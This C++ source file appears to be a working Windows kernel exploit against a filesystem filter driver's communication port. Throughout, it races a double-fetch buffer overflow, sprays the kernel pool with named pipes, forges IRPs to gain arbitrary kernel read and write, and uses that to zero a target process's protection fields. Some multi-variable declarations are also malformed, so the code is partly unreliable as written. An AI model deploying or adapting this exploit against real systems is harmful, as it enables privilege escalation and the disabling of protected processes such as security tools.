#include "Trufos.h"
#include <Fltuser.h>
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include "NtoskrnlOffsetFinder.h"

#pragma comment(lib, "fltlib")

void Xor(XorParams* Params)
{
    volatile unsigned __int16* AddressToXor = Params->AddressToXor;
    unsigned __int16 ValueToXor = Params->ValueToXor;
    while (true)
    {
        *AddressToXor ^= ValueToXor;
    }
}

void Trufos::FindCcbWithDataQueue(void* Ccb, void* FlinkOfFirstDataQueue, void** OutCcb, void** OutDataQueueEntry)
{
    bool IsCcbFound = false; 
    void* CurrentCcb;
    void* CcbFlink = (BYTE*)Ccb + 0x18; //Flink to next ccb
    void* ResultCcb = nullptr,
        *ResultDataQueueEntry = nullptr;
    for (unsigned int i = 0; i < 1000000; i++)
    {
        if (!CcbFlink)
        {
            break;
        }
        //std::cout << "CcbFlink: 0x" << std::hex << CcbFlink << std::endl;
        ArbitraryRead(CcbFlink, &CurrentCcb, sizeof(void*));
        void* DataQueue = nullptr;
        ArbitraryRead((BYTE*)CurrentCcb + 0x90, &DataQueue, sizeof(void*));
        if (DataQueue == nullptr)
        {
            CcbFlink = CurrentCcb;
            continue;
        }
        //std::cout << "DataQueue: 0x" << std::hex << DataQueue << std::endl;
        void* NextDataQueue;
        ArbitraryRead(DataQueue, &NextDataQueue, sizeof(void*));
        //std::cout << "NextDataQueue: 0x" << std::hex << NextDataQueue << std::endl;
        if (NextDataQueue == FlinkOfFirstDataQueue)
        {
            std::cout << "Ccb found after " << std::dec << i << " iterations" << std::endl;
            ResultCcb = (BYTE*)CurrentCcb + 0x90;
            ResultDataQueueEntry = DataQueue;
            IsCcbFound = true;
            break;
        }
        CcbFlink = CurrentCcb;
    }
    if (!IsCcbFound)
    {
        std::cout << "Failed to find ccb :(" << std::endl;
        *OutCcb = nullptr;
        *OutDataQueueEntry = nullptr;
        return;
    }
    if (OutCcb)
    {
        *OutCcb = (BYTE*)ResultCcb - 0xA8;
    }
    if (OutDataQueueEntry)
    {
        *OutDataQueueEntry = ResultDataQueueEntry;
    }
}

Trufos::Trufos()
{
    if (ConnectToCommunicationPort())
    {
        PrepareCommunicationPort();
        if (SetupArbitraryRead() && SetupArbitraryWrite())
        {
            IsSetupped = true;
        }
    }
}

bool Trufos::ConnectToCommunicationPort()
{
	HRESULT Result = FilterConnectCommunicationPort(L"\\TRFCOMMPORT", 0, 0, 0, 0, &Port);
    if (Result != S_OK)
    {
        std::cout << "Connection failed :(" << std::endl <<
            "Result: 0x" << std::hex << Result << std::endl;
        return false;
    }
    std::cout << "Connected to filter communication port :D" << std::endl;
    return true;
}

void Trufos::PrepareCommunicationPort()
{
    //I dont know what this value means but it must be equal to 0x12355321
    DWORD Input = 0x12355321;
    DWORD Output = 0;
    DWORD Returned = 0;
    FilterSendMessage(Port, &Input, sizeof(Input), &Output, sizeof(Output), &Returned);

    //Same as above, i dont know what these values in input buffer mean, but
    //it is required to later trigger buffer overflow
    const SIZE_T InputBufferSize = 0x14;
    BYTE* InputBuffer = new BYTE[InputBufferSize];
    memset(InputBuffer, 0, InputBufferSize);
    *(DWORD*)InputBuffer = 0xA;
    *(DWORD*)(InputBuffer + 4) = 2;
    *(DWORD*)(InputBuffer + 8) = 6;
    *(DWORD*)(InputBuffer + 0xC) = 2;

    const SIZE_T OutputBufferSize = 0x1C;
    BYTE* OutputBuffer = new BYTE[OutputBufferSize];
    memset(OutputBuffer, 0, OutputBufferSize);

    FilterSendMessage(Port, InputBuffer, InputBufferSize, OutputBuffer, OutputBufferSize, &Returned);

    delete[] InputBuffer;
    delete[] OutputBuffer;
}

bool Trufos::SetupArbitraryRead()
{
    if (IsArbitraryReadSetupped)
    {
        return true;
    }

    const UINT64 NamedPipesCount = 10000;
    const UINT64 PipeBufferSize = 0x50;
    HANDLE* NamedPipes = new HANDLE[NamedPipesCount];
    HANDLE* NamedPipesClients = new HANDLE[NamedPipesCount];
    
    //Buffer which will be written to named pipes
    BYTE* BufferToWrite = new BYTE[PipeBufferSize];
    memset(BufferToWrite, 'A', PipeBufferSize);
    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        NamedPipes[i] = CreateNamedPipeW(L"\\\\.\\pipe\\1234",
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            PipeBufferSize,
            PipeBufferSize,
            0,
            0);
        if (NamedPipes[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to create named pipe :(" << std::endl;
            continue;
        }

        NamedPipesClients[i] = CreateFileW(L"\\\\.\\pipe\\1234", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (NamedPipesClients[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to connect to named pipe :(" << std::endl;
        }

        DWORD BytesWritten = 0;
        bool Result = WriteFile(NamedPipes[i], BufferToWrite, PipeBufferSize, &BytesWritten, 0);
        if (!Result)
        {
            std::cout << "Failed to write to named pipe :(" << std::endl;
        }
    }

    //free some data queue entries
    for (unsigned int i = 0; i < NamedPipesCount; i += 5)
    {
        CloseHandle(NamedPipesClients[i]);
        NamedPipesClients[i] = INVALID_HANDLE_VALUE;
        CloseHandle(NamedPipes[i]);
        NamedPipes[i] = INVALID_HANDLE_VALUE;
    }

    const UINT64 InputBufferLength = 0xA0,
        //sizeof(POOL_HEADER) + Flink from data queue entry
        const OverflowSize = sizeof(POOL_HEADER) + sizeof(void*);
    const UINT64 SizeOfData2 = PipeBufferSize + sizeof(DATA_QUEUE_ENTRY);
    BYTE* InputBuffer = new BYTE[InputBufferLength + OverflowSize];
    memset(InputBuffer, 0, InputBufferLength + OverflowSize);
    *(DWORD*)InputBuffer = 0xC;
    *(DWORD*)(InputBuffer + 4) = 1;
    *(unsigned __int16*)(InputBuffer + 0x1C) = SizeOfData2;
    //It will start copying buffer from InputBuffer + 0x1E
    POOL_HEADER* PoolHeader = (POOL_HEADER*)(InputBuffer + 0x1E + SizeOfData2);
    PoolHeader->BlockSize = (SizeOfData2 + sizeof(POOL_HEADER)) >> 4;
    PoolHeader->PoolType = 0x200; //NonPagedPoolNx
    PoolHeader->PoolTag = 'NpFr';
    
    DATA_QUEUE_ENTRY* DataQueueEntry = (DATA_QUEUE_ENTRY*)malloc(sizeof(DATA_QUEUE_ENTRY) + 0x100);
    memset(DataQueueEntry, 0, sizeof(DATA_QUEUE_ENTRY) + 0x100);

    //Set flink in overflowd DATA_QUEUE_ENTRY to point to DataQueueEntry
    *(void**)(InputBuffer + 0x1E + SizeOfData2 + sizeof(POOL_HEADER)) = DataQueueEntry;

    //it will try to read mz signature of ntoskrnl.exe
    DataQueueEntry->DataSize = 2; //sizeof mz magic
    DataQueueEntry->EntryType = 1;
    IRP* Irp = new IRP;
    memset(Irp, 0, sizeof(IRP));
    void* Ntoskrnl = GetKernelDriverAddress("ntoskrnl.exe");
    std::cout << "Ntoskrnl.exe address: 0x" << std::hex << Ntoskrnl << std::endl;
    Irp->AssociatedIrp.SystemBuffer = Ntoskrnl;
    DataQueueEntry->Irp = Irp; 

    const UINT64 OutputBufferLength = 0x10;
    BYTE* OutputBuffer = new BYTE[OutputBufferLength];
    memset(OutputBuffer, 0, OutputBufferLength);

    XorParams Params;
    //Address of SizeOfData2
    Params.AddressToXor = (volatile unsigned __int16*)(InputBuffer + 0x1C);
    Params.ValueToXor = SizeOfData2 ^ (SizeOfData2 + OverflowSize);
    HANDLE FlippingThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Xor, &Params, 0, 0);
    if (FlippingThread == NULL)
    {
        std::cout << "Failed to create thread :(" << std::endl;
        return false;
    }

    DWORD BytesRead = 0;
    BYTE* ReadedFromNamedPipe = new BYTE[PipeBufferSize + 2]; //2 is size of mz signature
    bool IsOverflownPipeFound = false;
    unsigned int IndexOfOverflowedPipe = 0;
    std::cout << "Trying to trigger buffer overflow for arbitrary read..." << std::endl;
    for(unsigned int j = 0; true; j++)
    {
        DWORD BytesReturned = 0;
        HRESULT Result = FilterSendMessage(Port, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, &BytesReturned);
        if (Result != S_OK)
        {
            continue;
        }
        for (unsigned int i = 0; i < NamedPipesCount; i++)
        {
            if (NamedPipes[i] != INVALID_HANDLE_VALUE 
                && NamedPipesClients[i] != INVALID_HANDLE_VALUE)
            {
                PeekNamedPipe(NamedPipesClients[i], ReadedFromNamedPipe, PipeBufferSize + 2, &BytesRead, 0, 0);
                if (BytesRead == PipeBufferSize + 2)
                {
                    if (ReadedFromNamedPipe[PipeBufferSize] == 'M'
                        && ReadedFromNamedPipe[PipeBufferSize + 1] == 'Z')
                    {
                        IndexOfOverflowedPipe = i;
                        IsOverflownPipeFound = true;
                        break;
                    }
                    std::cout << "Read some invalid data, bsod shoud occur ;(" << std::endl;
                }
            }
        }
        if (IsOverflownPipeFound)
        {
            std::cout << "Buffer overflow triggered after " << std::dec << j << " iterations" << std::endl;
            break;
        }
    }

    if (!TerminateThread(FlippingThread, 0))
    {
        std::cout << "Failed to terminate flipping thread :(" << std::endl;
    }
    else
    {
        delete[] InputBuffer;
    }
    delete[] OutputBuffer;

    VulnerablePipe = NamedPipesClients[IndexOfOverflowedPipe];
    OffsetOfData = PipeBufferSize;

    IsArbitraryReadSetupped = true;
    ArbitraryReadIrp = Irp;
    UserDataQueue = DataQueueEntry;

    //Free named pipes which were used to spray heap
    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        if (i == IndexOfOverflowedPipe)
        {
            continue;
        }
        if (NamedPipesClients[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipesClients[i]);
        }
        if (NamedPipes[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipes[i]);
        }
    }

    delete[] NamedPipes;
    delete[] NamedPipesClients;

    return true;
}

bool Trufos::ArbitraryRead(void* AddressToReadFrom, void* Destination, UINT64 BytesToRead)
{
    if (!IsArbitraryReadSetupped)
    {
        return false;
    }
    memset(UserDataQueue, 0, sizeof(DATA_QUEUE_ENTRY));
    UserDataQueue->NextEntry.Flink = ListEntryOfUserDataQueue.Flink;
    UserDataQueue->NextEntry.Blink = ListEntryOfUserDataQueue.Blink;
    UserDataQueue->QuotaInEntry = 0;
    UserDataQueue->Irp = ArbitraryReadIrp;
    UserDataQueue->DataSize = BytesToRead + 1;
    UserDataQueue->EntryType = 1;
    ArbitraryReadIrp->AssociatedIrp.SystemBuffer = AddressToReadFrom;
    BYTE* Buffer = new BYTE[OffsetOfData + BytesToRead];
    memset(Buffer, 0, OffsetOfData + BytesToRead);
    DWORD ReadBytes = 0;
    PeekNamedPipe(VulnerablePipe, Buffer, OffsetOfData + BytesToRead, &ReadBytes, 0, 0);
    if (OffsetOfData + BytesToRead != ReadBytes)
    {
        std::cout << "Arbitrary read probably failed, read 0x"
            << std::hex << ReadBytes << " instead of 0x"
            << OffsetOfData + BytesToRead << " bytes" << std::endl;
    }
    memcpy(Destination, Buffer + OffsetOfData, BytesToRead);
    delete[] Buffer;
    return true;
}

bool Trufos::SetupArbitraryWrite()
{
    if (IsArbitraryWriteSetupped)
    {
        return true;
    }
    if (!IsArbitraryReadSetupped)
    {
        return false;
    }

    const UINT64 NamedPipesCount = 15000;
    const UINT64 PipeBufferSize = 0x40;
    HANDLE* NamedPipes = new HANDLE[NamedPipesCount];
    HANDLE* NamedPipesClients = new HANDLE[NamedPipesCount];
    
    //Buffer which will be written to named pipes
    BYTE* BufferToWrite = new BYTE[PipeBufferSize];
    memset(BufferToWrite, 'A', PipeBufferSize);

    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        NamedPipes[i] = CreateNamedPipeW(L"\\\\.\\pipe\\1234",
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            PipeBufferSize,
            PipeBufferSize,
            0,
            0);
        if (NamedPipes[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to create named pipe :(" << std::endl;
            continue;
        }

        NamedPipesClients[i] = CreateFileW(L"\\\\.\\pipe\\1234", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (NamedPipesClients[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to connect to named pipe :(" << std::endl;
        }

        DWORD BytesWritten = 0;
        *(unsigned int*)BufferToWrite = i;
        bool Result = WriteFile(NamedPipes[i], BufferToWrite, PipeBufferSize, &BytesWritten, 0);
        if (!Result)
        {
            std::cout << "Failed to write to named pipe :(" << std::endl;
        }
    }

    for (unsigned int i = 0; i < NamedPipesCount; i += 25)
    {
        CloseHandle(NamedPipesClients[i]);
        NamedPipesClients[i] = INVALID_HANDLE_VALUE;
        CloseHandle(NamedPipes[i]);
        NamedPipes[i] = INVALID_HANDLE_VALUE;
    }

    const UINT64 InputBufferLength = 0x90,
        const OverflowSize = sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY),
        const SizeOfData2 = PipeBufferSize + sizeof(DATA_QUEUE_ENTRY);
    BYTE* InputBuffer = new BYTE[InputBufferLength + OverflowSize];
    memset(InputBuffer, 0, InputBufferLength + OverflowSize);
    *(DWORD*)InputBuffer = 0xC;
    *(DWORD*)(InputBuffer + 4) = 1;
    *(unsigned __int16*)(InputBuffer + 0x1C) = SizeOfData2;
    POOL_HEADER* PoolHeader = (POOL_HEADER*)(InputBuffer + 0x1E + SizeOfData2);
    PoolHeader->BlockSize = (SizeOfData2 + sizeof(POOL_HEADER)) >> 4;
    PoolHeader->PoolTag = 'NpFr';
    PoolHeader->PoolType = 0x200; //NonPagedPoolNx
    DATA_QUEUE_ENTRY* DataQueueEntry = (DATA_QUEUE_ENTRY*)(InputBuffer + 0x1E + SizeOfData2 + sizeof(POOL_HEADER));
    DataQueueEntry->DataSize = PipeBufferSize + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY) + sizeof(unsigned int);
    DataQueueEntry->EntryType = 0;
    DataQueueEntry->Irp = 0;
    DataQueueEntry->QuotaInEntry = DataQueueEntry->DataSize;

    const UINT64 OutputBufferLength = 0x10;
    BYTE* OutputBuffer = new BYTE[OutputBufferLength];
    memset(OutputBuffer, 0, OutputBufferLength);

    XorParams Params;
    Params.AddressToXor = (volatile unsigned __int16*)(InputBuffer + 0x1C);
    Params.ValueToXor = SizeOfData2 ^ (SizeOfData2 + OverflowSize);
    HANDLE FlippingThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Xor, &Params, 0, 0);
    if (FlippingThread == NULL)
    {
        std::cout << "Failed to create thread :(" << std::endl;
        return false;
    }

    DWORD BytesRead = 0;
    BYTE* ReadFromNamedPipe = new BYTE[PipeBufferSize + OverflowSize + sizeof(unsigned int)];
    bool IsOverflownPipeFound = false;
    unsigned int IndexOfOverflowedPipe = 0;
    std::cout << "Trying to trigger buffer overflow for arbitrary write..." << std::endl;
    for (unsigned int j = 0; true; j++)
    {
        DWORD BytesReturned = 0;
        HRESULT Result = FilterSendMessage(Port, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, &BytesReturned);
        if (Result != S_OK)
        {
            continue;
        }
        for (unsigned int i = 0; i < NamedPipesCount; i++)
        {
            if (NamedPipes[i] != INVALID_HANDLE_VALUE
                && NamedPipesClients[i] != INVALID_HANDLE_VALUE)
            {
                PeekNamedPipe(NamedPipesClients[i], ReadFromNamedPipe, PipeBufferSize + OverflowSize + sizeof(unsigned int), &BytesRead, 0, 0);
                if (BytesRead != PipeBufferSize)
                {
                    if (BytesRead == PipeBufferSize + OverflowSize + sizeof(unsigned int))
                    {
                        IndexOfOverflowedPipe = i;
                        IsOverflownPipeFound = true;
                        break;
                    }
                    std::cout << "Bsod is coming ;o" << std::endl;
                }
            }
        }
        if (IsOverflownPipeFound)
        {
            std::cout << "Buffer overflow triggered after " << std::dec << j << " iterations" << std::endl;
            break;
        }
    }

    if (!TerminateThread(FlippingThread, 0))
    {
        std::cout << "Failed to terminate flipping thread :(" << std::endl;
    }
    else
    {
        delete[] InputBuffer;
    }
    delete[] OutputBuffer;

    DATA_QUEUE_ENTRY* ReadDataQueue = (DATA_QUEUE_ENTRY*)(ReadFromNamedPipe + PipeBufferSize + sizeof(POOL_HEADER));

    unsigned int IndexOfPipeWithForgedIrps = *(unsigned int*)(ReadFromNamedPipe + PipeBufferSize + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY));
    if (NamedPipes[IndexOfPipeWithForgedIrps] == INVALID_HANDLE_VALUE
        || NamedPipesClients[IndexOfPipeWithForgedIrps] == INVALID_HANDLE_VALUE)
    {
        std::cout << "Pipe which should have hold forged irps is already freed" << std::endl;
        std::cout << "Bsod will occur in a moment :c" << std::endl;
        return false;
    }
    std::cout << "Index of pipe which should hold forged irps: " << std::dec << IndexOfPipeWithForgedIrps << std::endl;

    PipeWithForgedIrps = NamedPipes[IndexOfPipeWithForgedIrps];

    //Address of data queue entry which belongs to pipe with forged irps
    void* AddressOfVulnerableDataQueueEntry,
        * Ccb;
    ArbitraryRead(ReadDataQueue->NextEntry.Blink, &AddressOfVulnerableDataQueueEntry, sizeof(void*));
    std::cout << "Address of data queue entry which belongs to pipe with forged irps: 0x" << std::hex << AddressOfVulnerableDataQueueEntry << std::endl;
    Ccb = (BYTE*)ReadDataQueue->NextEntry.Blink - 0xA8; //0xA8 of offset of data queue entry linked list in ccb

    CcbWithForgedIrps = Ccb;

    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtFsControlFile");
    IO_STATUS_BLOCK StatusBlock;
    NTSTATUS Status = NtFsControlFile(NamedPipes[IndexOfPipeWithForgedIrps], 0, 0, 0, &StatusBlock, 0x119FF8, BufferToWrite, PipeBufferSize, 0, 0);
    std::cout << "NtFsControlFile returned: 0x" << std::hex << Status << std::endl;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    LIST_ENTRY ListEntry;
    ArbitraryRead(AddressOfVulnerableDataQueueEntry, &ListEntry, sizeof(LIST_ENTRY));
    DATA_QUEUE_ENTRY DataQueueWithIrp;
    ArbitraryRead(ListEntry.Flink, &DataQueueWithIrp, sizeof(DATA_QUEUE_ENTRY));
    std::cout << "Irp to forge: 0x" << DataQueueWithIrp.Irp << std::endl;

    SizeOfForgedIrp = sizeof(IRP) + 0x200;
    ForgedIrp = (IRP*)malloc(SizeOfForgedIrp);
    memset(ForgedIrp, 0, SizeOfForgedIrp);
    ArbitraryRead(DataQueueWithIrp.Irp, ForgedIrp, SizeOfForgedIrp);

    const ULONG IRP_BUFFERED_IO = 0x10,
        const IRP_DEALLOCATE_BUFFER = 0x20,
        const IRP_INPUT_OPERATION = 0x40;
    ForgedIrp->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    ForgedIrp->Flags &= ~IRP_DEALLOCATE_BUFFER;

    void* CcbOfUserDataQueue,
        * BlinkOfUserDataQueue;
    FindCcbWithDataQueue(Ccb, UserDataQueue, &CcbOfUserDataQueue, &BlinkOfUserDataQueue);
    ListEntryOfUserDataQueue.Flink = (LIST_ENTRY*)((BYTE*)CcbOfUserDataQueue + 0xA8);
    ListEntryOfUserDataQueue.Blink = (LIST_ENTRY*)BlinkOfUserDataQueue;
    std::cout << "BlinkOfUserDataQueue: 0x" << std::hex << BlinkOfUserDataQueue << std::endl;

    IsArbitraryWriteSetupped = true;

    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        if (i == IndexOfOverflowedPipe ||
            i == IndexOfPipeWithForgedIrps)
        {
            continue;
        }
        if (NamedPipes[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipes[i]);
        }
        if (NamedPipesClients[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipesClients[i]);
        }
    }

    return true;
}

bool Trufos::ArbitraryWrite(void* AddressToWrite, void* Source, UINT64 BytesToWrite)
{
    if (!IsArbitraryReadSetupped || !IsArbitraryWriteSetupped || !IsSetupped)
    {
        return false;
    }

    LIST_ENTRY ThreadList{ 0 };

    ForgedIrp->UserBuffer = AddressToWrite;
    ForgedIrp->AssociatedIrp.SystemBuffer = Source;
    ForgedIrp->ThreadListEntry.Flink = &ThreadList;
    ForgedIrp->ThreadListEntry.Blink = &ThreadList;
    
    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtFsControlFile");
    IO_STATUS_BLOCK StatusBlock;
    NtFsControlFile(PipeWithForgedIrps, 0, 0, 0, &StatusBlock, 0x119FF8, ForgedIrp, SizeOfForgedIrp, 0, 0);
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    
    void* DataQueueWithForgedIrp;
    ArbitraryRead((BYTE*)CcbWithForgedIrps + 0xB0, &DataQueueWithForgedIrp, sizeof(void*));
    std::cout << "Data queue entry with forged irp: 0x" << std::hex << DataQueueWithForgedIrp << std::endl;
    void* IrpAddress;
    ArbitraryRead((BYTE*)DataQueueWithForgedIrp + offsetof(DATA_QUEUE_ENTRY, Irp), &IrpAddress, sizeof(void*));
    std::cout << "Irp which holds forged irp: 0x" << std::hex << IrpAddress << std::endl;
    void* ForgedIrpAddress;
    ArbitraryRead((BYTE*)IrpAddress + offsetof(IRP, AssociatedIrp.SystemBuffer), &ForgedIrpAddress, sizeof(void*));
    std::cout << "Forged irp address: 0x" << std::hex << ForgedIrpAddress << std::endl;

    ThreadList.Flink = (LIST_ENTRY*)((BYTE*)ForgedIrpAddress + offsetof(IRP, ThreadListEntry));
    ThreadList.Blink = (LIST_ENTRY*)((BYTE*)ForgedIrpAddress + offsetof(IRP, ThreadListEntry));

    memset(UserDataQueue, 0, sizeof(DATA_QUEUE_ENTRY));
    UserDataQueue->EntryType = 0;
    UserDataQueue->NextEntry.Flink = ListEntryOfUserDataQueue.Flink;
    UserDataQueue->NextEntry.Blink = ListEntryOfUserDataQueue.Blink;
    UserDataQueue->QuotaInEntry = BytesToWrite - 1;
    UserDataQueue->DataSize = BytesToWrite;
    UserDataQueue->Irp = ForgedIrpAddress;

    BYTE Output;
    DWORD BytesRead;
    bool Result = ReadFile(VulnerablePipe, &Output, 1, &BytesRead, 0);
    std::cout << "ReadFile returned: " << Result << std::endl;
    OffsetOfData--;
    return true;
}

bool Trufos::DisableProcessProtection(DWORD ProcessId)
{
    if (!IsArbitraryReadSetupped || !IsArbitraryWriteSetupped)
    {
        std::cout << "Can not disable process protection because arbitrary read or write is not setupped :/" << std::endl;
        return false;
    }

    void* TargetEprocess = GetEprocessAddressByPid(ProcessId);
    if (!TargetEprocess)
    {
        std::cout << "Failed to find eprocess for pid: " << std::dec << ProcessId << std::endl;
    }
    std::cout << "Target eprocess: 0x" << std::hex << TargetEprocess << std::endl;

    BYTE Buffer[3];
    memset(Buffer, 0, sizeof(Buffer));

    return ArbitraryWrite(((BYTE*)TargetEprocess + OffsetFinder.GetSignatureLevelOffset()), Buffer, sizeof(Buffer));
}

const bool Trufos::GetIsSetupped()
{
    return IsSetupped;
}

void* Trufos::GetEprocessAddressByPid(DWORD ProcessId)
{
    if (!IsArbitraryReadSetupped)
    {
        return nullptr;
    }

    void* Ntoskrnl = GetKernelDriverAddress("ntoskrnl.exe");

    void* SystemProcess;
    ArbitraryRead((void*)((UINT64)Ntoskrnl + OffsetFinder.GetPsInitialSystemProcessOffset()), &SystemProcess, sizeof(void*));
    //std::cout << "EPROCESS of system process address: 0x" << std::hex << SystemProcess << std::endl;
    void* i = SystemProcess;
    bool IsProcessFound = false;
    do
    {
        void* Pid;
        ArbitraryRead((void*)((UINT64)i + OffsetFinder.GetUniqueProcessIdOffset()), &Pid, sizeof(void*));
        if ((DWORD)Pid == ProcessId)
        {
            IsProcessFound = true;
            break;
        }
        void* NextProcessAddress;
        ArbitraryRead((void*)((UINT64)i + OffsetFinder.GetActiveProcessLinksOffset()), &NextProcessAddress, sizeof(void*));
        NextProcessAddress = (void*)((UINT64)NextProcessAddress - OffsetFinder.GetActiveProcessLinksOffset());
        i = NextProcessAddress;
    } while (i != SystemProcess);

    if (!IsProcessFound)
    {
        //std::cout << "Could not find process with provided pid :(" << std::endl;
        return nullptr;
    }
    return i;
}